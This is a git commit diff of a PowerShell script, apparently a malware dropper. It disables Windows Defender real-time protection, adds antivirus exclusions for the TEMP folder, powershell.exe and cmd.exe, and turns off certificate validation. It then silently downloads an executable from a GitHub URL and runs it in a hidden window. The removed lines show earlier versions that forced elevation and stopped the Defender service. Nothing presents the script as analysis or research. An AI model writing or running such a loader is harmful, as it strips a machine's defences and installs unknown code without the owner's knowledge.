9bfd4ce21bedf8143d2995b5c2ed68b0f9bd8de5
! / socialhate <socialhate@proton.me>
2026-05-22 11:36:39 +0300

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,20 +1,14 @@
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
-    Exit
-}
-Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
 $exePath = "$env:TEMP\1.exe"
 $url = "https://github.com/socialhate/Test/raw/refs/heads/main/1.exe"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $webclient = New-Object Net.WebClient
 $webclient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 $webclient.DownloadFile($url, $exePath)
 Unblock-File -Path $exePath -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath $exePath -Force -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess "1.exe" -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 2
 Start-Process -FilePath $exePath -WindowStyle Hidden
-
 Exit
